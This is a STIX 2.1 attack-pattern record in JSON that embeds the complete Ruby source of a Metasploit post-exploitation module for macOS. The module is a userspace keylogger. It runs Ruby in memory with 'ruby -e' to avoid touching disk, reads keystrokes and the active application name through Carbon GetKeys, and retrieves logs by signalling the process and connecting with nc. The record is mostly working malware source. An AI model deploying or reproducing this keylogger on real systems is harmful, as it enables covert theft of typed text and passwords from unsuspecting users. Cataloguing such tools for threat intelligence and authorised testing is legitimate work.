{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ca6ef97e-9172-40ad-a9a5-d14f4f7f045f",
    "created": "2024-08-14T16:33:00.705754Z",
    "modified": "2024-08-14T16:33:00.705757Z",
    "name": "OSX Capture Userspace Keylogger",
    "description": " Logs all keyboard events except cmd-keys and GUI password input.  Keylogs are transferred between client/server in chunks every SYNCWAIT seconds for reliability.  Works by calling the Carbon GetKeys() hook using the DL lib in OSX's system Ruby. The Ruby code is executed in a shell command using -e, so the payload never hits the disk.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/capture/keylog_recorder.rb",
            "external_id": "keylog_recorder.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'shellwords'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n\n  # when we need to read from the keylogger,\n  # we first \"knock\" the process by sending a USR1 signal.\n  # the keylogger opens a local tcp port (22899 by default) momentarily\n  # that we can connect to and read from (using cmd_exec(telnet ...)).\n  attr_accessor :port\n\n  # the pid of the keylogger process\n  attr_accessor :pid\n\n  # where we are storing the keylog\n  attr_accessor :loot_path\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OSX Capture Userspace Keylogger',\n        'Description' => %q{\n          Logs all keyboard events except cmd-keys and GUI password input.\n\n          Keylogs are transferred between client/server in chunks\n          every SYNCWAIT seconds for reliability.\n\n          Works by calling the Carbon GetKeys() hook using the DL lib\n          in OSX's system Ruby. The Ruby code is executed in a shell\n          command using -e, so the payload never hits the disk.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'joev'],\n        'Platform' => [ 'osx'],\n        'SessionTypes' => [ 'shell', 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('DURATION',\n                   [ true, 'The duration in seconds.', 600 ]),\n        OptInt.new('SYNCWAIT',\n                   [ true, 'The time between transferring log chunks.', 10 ]),\n        OptPort.new('LOGPORT',\n                    [ false, 'Local port opened momentarily for log transfer', 22899 ])\n      ]\n    )\n  end\n\n  def run_ruby_code\n    # to pass args to ruby -e we use ARGF (stdin) and yaml\n    opts = {\n      duration: datastore['DURATION'].to_i,\n      port: port\n    }\n\n    cmd = \"OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES ruby -e #{ruby_code(opts).shellescape}\"\n    rpid = cmd_exec(cmd, nil, 10)\n\n    if rpid =~ /^\\d+/\n      print_status \"Ruby process executing with pid #{rpid.to_i}\"\n      rpid.to_i\n    else\n      fail_with(Failure::Unknown, \"Ruby keylogger command failed with error #{rpid}\")\n    end\n  end\n\n  def run\n    if session.nil?\n      print_error 'Invalid SESSION id.'\n      return\n    end\n\n    if datastore['DURATION'].to_i < 1\n      print_error 'Invalid DURATION value.'\n      return\n    end\n\n    print_status 'Executing ruby command to start keylogger process.'\n\n    @port = datastore['LOGPORT'].to_i\n    @pid = run_ruby_code\n\n    begin\n      Timeout.timeout(datastore['DURATION'] + 5) do # padding to read the last logs\n        print_status 'Entering read loop'\n        loop do\n          print_status \"Waiting #{datastore['SYNCWAIT']} seconds.\"\n          Rex.sleep(datastore['SYNCWAIT'])\n          print_status 'Sending USR1 signal to open TCP port...'\n          cmd_exec(\"kill -USR1 #{pid}\")\n          print_status 'Dumping logs...'\n          # Telnet is not installed in MacOS 10.13+\n          log = cmd_exec(\"nc localhost #{port}\")\n          log_a = log.scan(/^\\[.+?\\] \\[.+?\\] .*$/)\n          log = log_a.join(\"\\n\") + \"\\n\"\n          print_status \"#{log_a.size} keystrokes captured\"\n          next if log_a.empty?\n\n          if loot_path.nil?\n            self.loot_path = store_loot(\n              'keylog', 'text/plain', session, log, 'keylog.log', 'OSX keylog'\n            )\n          else\n            File.open(loot_path, 'ab') { |f| f.write(log) }\n          end\n          print_status(log_a.map do |a|\n                         a =~ /([^\\s]+)\\s*$/\n                         ::Regexp.last_match(1)\n                       end.join)\n          print_status \"Saved to #{loot_path}\"\n        end\n      end\n    rescue ::Timeout::Error\n      print_status 'Keylogger run completed.'\n    end\n  end\n\n  def kill_process(pid)\n    print_status \"Killing process #{pid.to_i}\"\n    cmd_exec(\"kill #{pid.to_i}\")\n  end\n\n  def cleanup\n    return if session.nil?\n    return if !@cleaning_up.nil?\n\n    @cleaning_up = true\n\n    if pid.to_i > 0\n      print_status('Cleaning up...')\n      kill_process(pid)\n    end\n  end\n\n  def ruby_code(opts = {})\n    <<~EOS\n      # Kick off a child process and let parent die\n      child_pid = fork do\n        require 'thread'\n        require 'fiddle'\n        require 'fiddle/import'\n\n        options = {\n          :duration => #{opts[:duration]},\n          :port => #{opts[:port]}\n        }\n\n        #### 1-way IPC ####\n\n        log = ''\n        log_semaphore = Mutex.new\n        Signal.trap(\"USR1\") do # signal used for port knocking\n          if not @server_listening\n            @server_listening = true\n            Thread.new do\n              require 'socket'\n              server = TCPServer.new(options[:port])\n              client = server.accept\n              log_semaphore.synchronize do\n                client.puts(log+\"\\n\")\n                log = ''\n              end\n              client.close\n              server.close\n              @server_listening = false\n            end\n          end\n        end\n\n        #### External dynamically linked code\n\n        SM_KCHR_CACHE = 38\n        SM_CURRENT_SCRIPT = -2\n        MAX_APP_NAME = 80\n\n        module Carbon\n          extend Fiddle::Importer\n          dlload '/System/Library/Frameworks/Carbon.framework/Carbon'\n          extern 'unsigned long CopyProcessName(const ProcessSerialNumber *, void *)'\n          extern 'void GetFrontProcess(ProcessSerialNumber *)'\n          extern 'void GetKeys(void *)'\n          extern 'unsigned char *GetScriptVariable(int, int)'\n          extern 'unsigned char KeyTranslate(void *, int, void *)'\n          extern 'unsigned char CFStringGetCString(void *, void *, int, int)'\n          extern 'int CFStringGetLength(void *)'\n        end\n\n        psn = Fiddle::Pointer.malloc(16)\n        name = Fiddle::Pointer.malloc(16)\n        name_cstr = Fiddle::Pointer.malloc(MAX_APP_NAME)\n        keymap = Fiddle::Pointer.malloc(16)\n        state = Fiddle::Pointer.malloc(8)\n\n        #### Actual Keylogger code\n\n        itv_start = Time.now.to_i\n        prev_down = Hash.new(false)\n        lastWindow = \"\"\n\n        while (true) do\n          Carbon.GetFrontProcess(psn.ref)\n          Carbon.CopyProcessName(psn.ref, name.ref)\n          Carbon.GetKeys(keymap)\n\n          str_len = Carbon.CFStringGetLength(name)\n          copied = Carbon.CFStringGetCString(name, name_cstr, MAX_APP_NAME, 0x08000100) > 0\n          app_name = if copied then name_cstr.to_s else 'Unknown' end\n\n          bytes = keymap.to_str\n          cap_flag = false\n          ascii = 0\n          ctrlchar = \"\"\n\n          (0...128).each do |k|\n            # pulled from apple's developer docs for Carbon#KeyMap/GetKeys\n            if ((bytes[k>>3].ord >> (k&7)) & 1 > 0)\n              if not prev_down[k]\n                case k\n                  when 36\n                    ctrlchar = \"[enter]\"\n                  when 48\n                    ctrlchar = \"[tab]\"\n                  when 49\n                    ctrlchar = \" \"\n                  when 51\n                    ctrlchar = \"[delete]\"\n                  when 53\n                    ctrlchar = \"[esc]\"\n                  when 55\n                    ctrlchar = \"[cmd]\"\n                  when 56\n                    ctrlchar = \"[shift]\"\n                  when 57\n                    ctrlchar = \"[caps]\"\n                  when 58\n                    ctrlchar = \"[option]\"\n                  when 59\n                    ctrlchar = \"[ctrl]\"\n                  when 63\n                    ctrlchar = \"[fn]\"\n                  else\n                    ctrlchar = \"\"\n                end\n                if ctrlchar == \"\" and ascii == 0\n                  kchr = Carbon.GetScriptVariable(SM_KCHR_CACHE, SM_CURRENT_SCRIPT)\n                  curr_ascii = Carbon.KeyTranslate(kchr, k, state)\n                  curr_ascii = curr_ascii >> 16 if curr_ascii < 1\n                  prev_down[k] = true\n                  if curr_ascii == 0\n                    cap_flag = true\n                  else\n                    ascii = curr_ascii\n                  end\n                elsif ctrlchar != \"\"\n                  prev_down[k] = true\n                end\n              end\n            else\n              prev_down[k] = false\n            end\n          end\n          if ascii != 0 or ctrlchar != \"\"\n            log_semaphore.synchronize do\n              if app_name != lastWindow\n                log = log << \"[\\#{Time.now.to_i}] [\\#{app_name}]\\n\"\n                lastWindow = app_name\n              end\n              if ctrlchar != \"\"\n                log = log << \"[\\#{Time.now.to_i}] [\\#{app_name}] \\#{ctrlchar}\\n\"\n              elsif ascii > 32 and ascii < 127\n                c = if cap_flag then ascii.chr.upcase else ascii.chr end\n                log = log << \"[\\#{Time.now.to_i}] [\\#{app_name}] \\#{c}\\n\"\n              else\n                log = log << \"[\\#{Time.now.to_i}] [\\#{app_name}] [\\#{ascii}]\\\\n\"\n              end\n            end\n          end\n\n          exit if Time.now.to_i - itv_start > options[:duration]\n          Kernel.sleep(0.01)\n        end\n      end\n\n      puts child_pid\n      Process.detach(child_pid)\n\n    EOS\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx']"
    ]
}